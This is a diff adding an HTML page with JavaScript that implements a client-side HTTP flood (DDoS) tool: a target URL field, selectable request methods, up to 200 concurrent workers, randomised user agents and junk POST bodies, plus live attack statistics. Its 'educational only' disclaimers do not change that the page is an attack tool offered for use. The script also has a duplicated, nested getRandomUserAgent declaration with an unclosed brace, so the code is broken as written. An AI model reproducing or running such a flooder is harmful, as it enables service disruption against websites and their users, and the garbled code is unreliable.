@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ HTTP Flood Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: #000;
+            color: #0f0;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 20, 0, 0.7);
+            border-radius: 10px;
+            margin-bottom: 30px;
+            border: 1px solid #0f0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
+            animation: scan 3s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        h1 {
+            color: #0f0;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #0f0;
+        }
+        
+        .subtitle {
+            color: #8f8;
+            font-size: 1em;
+            margin-bottom: 15px;
+        }
+        
+        .warning {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #f00;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            color: #f88;
+        }
+        
+        .control-panel {
+            background: rgba(0, 15, 0, 0.8);
+            border: 1px solid #0a0;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            color: #0f0;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px;
+            background: #001100;
+            border: 1px solid #0a0;
+            border-radius: 5px;
+            color: #0f0;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #0f0;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+        
+        .slider-container {
+            margin: 20px 0;
+        }
+        
+        .slider-value {
+            color: #0f0;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        input[type="range"] {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 10px;
+            background: #001100;
+            border-radius: 5px;
+            outline: none;
+        }
+        
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 25px;
+            height: 25px;
+            background: #0f0;
+            border-radius: 50%;
+            cursor: pointer;
+            box-shadow: 0 0 10px #0f0;
+        }
+        
+        .attack-controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .btn {
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+        
+        .btn-start {
+            background: linear-gradient(135deg, #001100, #003300);
+            color: #0f0;
+            border: 2px solid #0a0;
+        }
+        
+        .btn-stop {
+            background: linear-gradient(135deg, #110000, #330000);
+            color: #f00;
+            border: 2px solid #a00;
+        }
+        
+        .btn-reset {
+            background: linear-gradient(135deg, #111100, #333300);
+            color: #ff0;
+            border: 2px solid #aa0;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.3);
+        }
+        
+        .btn-start:hover {
+            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.5);
+        }
+        
+        .btn-stop:hover {
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.5);
+        }
+        
+        .btn-reset:hover {
+            box-shadow: 0 5px 15px rgba(255, 255, 0, 0.5);
+        }
+        
+        .stats-panel {
+            background: rgba(0, 20, 0, 0.7);
+            border: 1px solid #0a0;
+            border-radius: 10px;
+            padding: 25px;
+            margin-top: 30px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .stat-box {
+            background: rgba(0, 30, 0, 0.5);
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #0a0;
+        }
+        
+        .stat-value {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #0f0;
+            margin: 10px 0;
+            text-shadow: 0 0 10px #0f0;
+        }
+        
+        .stat-label {
+            color: #8f8;
+            font-size: 0.9em;
+        }
+        
+        .log-panel {
+            background: #000;
+            border: 1px solid #0a0;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .log-entry {
+            padding: 8px;
+            border-bottom: 1px solid #0a0;
+            font-family: monospace;
+            color: #8f8;
+            font-size: 0.9em;
+        }
+        
+        .log-entry.success {
+            color: #0f0;
+        }
+        
+        .log-entry.error {
+            color: #f00;
+        }
+        
+        .log-entry.warning {
+            color: #ff0;
+        }
+        
+        .progress-container {
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #001100;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #0a0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0a0, #0f0);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .method-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .method-btn {
+            padding: 10px 20px;
+            background: #001100;
+            border: 1px solid #0a0;
+            border-radius: 5px;
+            color: #8f8;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .method-btn.active {
+            background: #003300;
+            border-color: #0f0;
+            color: #0f0;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #0a0;
+            color: #8f8;
+            font-size: 0.8em;
+        }
+        
+        .connection-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 10px;
+            background: #f00;
+        }
+        
+        .connection-status.connected {
+            background: #0f0;
+            box-shadow: 0 0 10px #0f0;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .pulse {
+            animation: pulse 0.5s infinite;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #001100;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #0a0;
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #0f0;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .attack-controls {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚡ HTTP FLOOD TOOL</h1>
+            <div class="subtitle">Client-Side DDoS Simulation - Educational Purpose Only</div>
+            <div class="warning">
+                ⚠️ WARNING: This tool is for educational purposes only. Unauthorized use against websites is illegal and punishable by law.
+            </div>
+        </div>
+        
+        <div class="control-panel">
+            <div class="input-group">
+                <label for="targetUrl">🎯 Target URL:</label>
+                <input type="url" id="targetUrl" placeholder="https://example.com" value="https://example.com">
+            </div>
+            
+            <div class="method-options">
+                <div class="method-btn active" onclick="selectMethod('get')">GET</div>
+                <div class="method-btn" onclick="selectMethod('post')">POST</div>
+                <div class="method-btn" onclick="selectMethod('head')">HEAD</div>
+                <div class="method-btn" onclick="selectMethod('mixed')">MIXED</div>
+            </div>
+            
+            <div class="slider-container">
+                <div class="slider-value">Threads: <span id="threadsValue">50</span></div>
+                <input type="range" id="threads" min="1" max="200" value="50" oninput="updateSlider('threads')">
+            </div>
+            
+            <div class="slider-container">
+                <div class="slider-value">Requests per Thread: <span id="requestsValue">10</span></div>
+                <input type="range" id="requests" min="1" max="100" value="10" oninput="updateSlider('requests')">
+            </div>
+            
+            <div class="slider-container">
+                <div class="slider-value">Delay (ms): <span id="delayValue">100</span></div>
+                <input type="range" id="delay" min="0" max="1000" value="100" oninput="updateSlider('delay')">
+            </div>
+            
+            <div class="attack-controls">
+                <button class="btn btn-start" onclick="startAttack()">🚀 START ATTACK</button>
+                <button class="btn btn-stop" onclick="stopAttack()">⏹️ STOP ATTACK</button>
+                <button class="btn btn-reset" onclick="resetStats()">🔄 RESET</button>
+            </div>
+            
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="stats-panel">
+            <h2 style="color: #0f0; margin-bottom: 20px;">📊 ATTACK STATISTICS</h2>
+            
+            <div class="stats-grid">
+                <div class="stat-box">
+                    <div class="stat-label">Total Requests</div>
+                    <div class="stat-value" id="totalRequests">0</div>
+                </div>
+                
+                <div class="stat-box">
+                    <div class="stat-label">Successful</div>
+                    <div class="stat-value" id="successfulRequests">0</div>
+                </div>
+                
+                <div class="stat-box">
+                    <div class="stat-label">Failed</div>
+                    <div class="stat-value" id="failedRequests">0</div>
+                </div>
+                
+                <div class="stat-box">
+                    <div class="stat-label">Active Threads</div>
+                    <div class="stat-value" id="activeThreads">0</div>
+                </div>
+                
+                <div class="stat-box">
+                    <div class="stat-label">Requests/Sec</div>
+                    <div class="stat-value" id="requestsPerSec">0</div>
+                </div>
+                
+                <div class="stat-box">
+                    <div class="stat-label">Attack Time</div>
+                    <div class="stat-value" id="attackTime">0s</div>
+                </div>
+            </div>
+            
+            <div style="margin-top: 20px;">
+                <div style="display: flex; align-items: center; margin-bottom: 10px;">
+                    <div class="connection-status" id="connectionStatus"></div>
+                    <span style="color: #8f8;">Connection Status: <span id="statusText">Disconnected</span></span>
+                </div>
+            </div>
+            
+            <div class="log-panel" id="logPanel">
+                <div class="log-entry">[SYSTEM] Ready to start attack...</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>⚠️ FOR EDUCATIONAL USE ONLY | ⚖️ UNAUTHORIZED ATTACKS ARE ILLEGAL</p>
+            <p>🔒 Use only on websites you own or have permission to test</p>
+            <p>💻 Client-side limitations apply - limited effectiveness</p>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let isAttacking = false;
+        let attackStartTime = 0;
+        let totalRequests = 0;
+        let successfulRequests = 0;
+        let failedRequests = 0;
+        let activeWorkers = 0;
+        let attackMethod = 'get';
+        let requestInterval;
+        let lastUpdateTime = Date.now();
+        let requestsThisSecond = 0;
+        
+        // Update slider values
+        function updateSlider(sliderId) {
+            const slider = document.getElementById(sliderId);
+            const valueSpan = document.getElementById(sliderId + 'Value');
+            valueSpan.textContent = slider.value;
+        }
+        
+        // Select attack method
+        function selectMethod(method) {
+            attackMethod = method;
+            
+            // Update button styles
+            document.querySelectorAll('.method-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            addLog(`Method changed to: ${method.toUpperCase()}`, 'warning');
+        }
+        
+        // Add log entry
+        function addLog(message, type = 'info') {
+            const logPanel = document.getElementById('logPanel');
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry ${type}`;
+            
+            const timestamp = new Date().toLocaleTimeString();
+            logEntry.textContent = `[${timestamp}] ${message}`;
+            
+            logPanel.appendChild(logEntry);
+            logPanel.scrollTop = logPanel.scrollHeight;
+            
+            // Keep only last 50 logs
+            while (logPanel.children.length > 50) {
+                logPanel.removeChild(logPanel.firstChild);
+            }
+        }
+        
+        // Update statistics
+        function updateStats() {
+            const now = Date.now();
+            const elapsed = (now - attackStartTime) / 1000;
+            
+            // Update RPS every second
+            if (now - lastUpdateTime >= 1000) {
+                document.getElementById('requestsPerSec').textContent = requestsThisSecond;
+                requestsThisSecond = 0;
+                lastUpdateTime = now;
+            }
+            
+            // Update other stats
+            document.getElementById('totalRequests').textContent = totalRequests;
+            document.getElementById('successfulRequests').textContent = successfulRequests;
+            document.getElementById('failedRequests').textContent = failedRequests;
+            document.getElementById('activeThreads').textContent = activeWorkers;
+            document.getElementById('attackTime').textContent = elapsed.toFixed(1) + 's';
+            
+            // Update progress
+            const threads = parseInt(document.getElementById('threads').value);
+            const progress = (activeWorkers / threads) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+            
+            // Update connection status
+            const statusElem = document.getElementById('connectionStatus');
+            const statusText = document.getElementById('statusText');
+            
+            if (isAttacking) {
+                statusElem.className = 'connection-status connected pulse';
+                statusText.textContent = 'Attacking';
+                statusText.style.color = '#0f0';
+            } else {
+                statusElem.className = 'connection-status';
+                statusText.textContent = 'Stopped';
+                statusText.style.color = '#f00';
+            }
+        }
+        
+        // Make HTTP request
+        async function makeRequest(url, method) {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 10000);
+            
+            const requestOptions = {
+                method: method.toUpperCase(),
+                mode: 'no-cors', // Avoid CORS issues
+                signal: controller.signal,
+                headers: {
+                    'User-Agent': getRandomUserAgent(),
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Connection': 'keep-alive',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
+                }
+            };
+            
+            // Add body for POST requests
+            if (method === 'post') {
+                requestOptions.body = getRandomPostData();
+            }
+            
+            try {
+                const startTime = Date.now();
+                const response = await fetch(url, requestOptions);
+                const responseTime = Date.now() - startTime;
+                
+                clearTimeout(timeoutId);
+                
+                totalRequests++;
+                successfulRequests++;
+                requestsThisSecond++;
+                
+                // Log success
+                if (totalRequests % 10 === 0) {
+                    addLog(`Request #${totalRequests} sent (${responseTime}ms)`, 'success');
+                }
+                
+                return { success: true, time: responseTime };
+                
+            } catch (error) {
+                clearTimeout(timeoutId);
+                
+                totalRequests++;
+                failedRequests++;
+                requestsThisSecond++;
+                
+                // Log error occasionally
+                if (failedRequests % 5 === 0) {
+                    addLog(`Request failed: ${error.message}`, 'error');
+                }
+                
+                return { success: false, error: error.message };
+            }
+        }
+        
+        // Get random user agent
+        function getRandomUserAgent() {
+          // Get random user agent
+        function getRandomUserAgent() {
+            const userAgents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
+            ];
+            
+            return userAgents[Math.floor(Math.random() * userAgents.length)];
+        }
+        
+        // Get random POST data
+        function getRandomPostData() {
+            const data = {
+                username: getRandomString(8),
+                password: getRandomString(12),
+                email: `${getRandomString(6)}@${getRandomString(5)}.com`,
+                message: getRandomString(50),
+                timestamp: Date.now(),
+                random: Math.random()
+            };
+            
+            return JSON.stringify(data);
+        }
+        
+        // Generate random string
+        function getRandomString(length) {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+        
+        // Worker function
+        async function attackWorker(workerId) {
+            const url = document.getElementById('targetUrl').value;
+            const requestsPerWorker = parseInt(document.getElementById('requests').value);
+            const delay = parseInt(document.getElementById('delay').value);
+            
+            addLog(`Worker #${workerId} started`, 'warning');
+            
+            for (let i = 0; i < requestsPerWorker && isAttacking; i++) {
+                if (!isAttacking) break;
+                
+                let method = attackMethod;
+                if (method === 'mixed') {
+                    const methods = ['get', 'post', 'head'];
+                    method = methods[Math.floor(Math.random() * methods.length)];
+                }
+                
+                await makeRequest(url, method);
+                
+                if (delay > 0 && i < requestsPerWorker - 1) {
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                }
+            }
+            
+            addLog(`Worker #${workerId} finished`, 'warning');
+            activeWorkers--;
+        }
+        
+        // Start attack
+        function startAttack() {
+            if (isAttacking) {
+                addLog('Attack already in progress', 'error');
+                return;
+            }
+            
+            const url = document.getElementById('targetUrl').value;
+            if (!url || !url.startsWith('http')) {
+                addLog('Please enter a valid URL starting with http/https', 'error');
+                return;
+            }
+            
+            const threads = parseInt(document.getElementById('threads').value);
+            
+            if (threads > 100) {
+                if (!confirm(`Warning: ${threads} threads may overload your browser. Continue?`)) {
+                    return;
+                }
+            }
+            
+            // Reset stats
+            attackStartTime = Date.now();
+            totalRequests = 0;
+            successfulRequests = 0;
+            failedRequests = 0;
+            activeWorkers = 0;
+            requestsThisSecond = 0;
+            
+            isAttacking = true;
+            
+            addLog(`🚀 Starting attack on ${url}`, 'warning');
+            addLog(`Method: ${attackMethod.toUpperCase()} | Threads: ${threads}`, 'warning');
+            
+            // Start workers
+            for (let i = 0; i < threads && isAttacking; i++) {
+                activeWorkers++;
+                setTimeout(() => {
+                    if (isAttacking) {
+                        attackWorker(i + 1);
+                    }
+                }, i * 10); // Stagger worker start
+            }
+            
+            // Start stats update interval
+            clearInterval(requestInterval);
+            requestInterval = setInterval(updateStats, 100);
+            
+            updateStats();
+        }
+        
+        // Stop attack
+        function stopAttack() {
+            if (!isAttacking) {
+                addLog('No attack in progress', 'error');
+                return;
+            }
+            
+            isAttacking = false;
+            clearInterval(requestInterval);
+            
+            const elapsed = (Date.now() - attackStartTime) / 1000;
+            addLog(`⏹️ Attack stopped after ${elapsed.toFixed(1)} seconds`, 'warning');
+            addLog(`Results: ${successfulRequests} successful, ${failedRequests} failed`, 'warning');
+            
+            updateStats();
+        }
+        
+        // Reset statistics
+        function resetStats() {
+            if (isAttacking) {
+                stopAttack();
+            }
+            
+            totalRequests = 0;
+            successfulRequests = 0;
+            failedRequests = 0;
+            activeWorkers = 0;
+            requestsThisSecond = 0;
+            
+            document.getElementById('logPanel').innerHTML = '<div class="log-entry">[SYSTEM] Statistics reset</div>';
+            
+            updateStats();
+            addLog('Statistics reset', 'warning');
+        }
+        
+        // Initialize
+        updateSlider('threads');
+        updateSlider('requests');
+        updateSlider('delay');
+        updateStats();
+        
+        // Auto-stop protection
+        window.addEventListener('beforeunload', function(e) {
+            if (isAttacking) {
+                e.preventDefault();
+                e.returnValue = 'Attack is still running. Are you sure you want to leave?';
+            }
+        });
+        
+        // Keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'Enter') {
+                if (!isAttacking) {
+                    startAttack();
+                } else {
+                    stopAttack();
+                }
+            }
+            
+            if (e.key === 'Escape') {
+                stopAttack();
+            }
+        });
+        
+        // Add initial logs
+        addLog('System initialized');
+        addLog('Press Ctrl+Enter to start/stop attack');
+        addLog('Press Escape to stop attack');
+    </script>
+</body>
+</html>
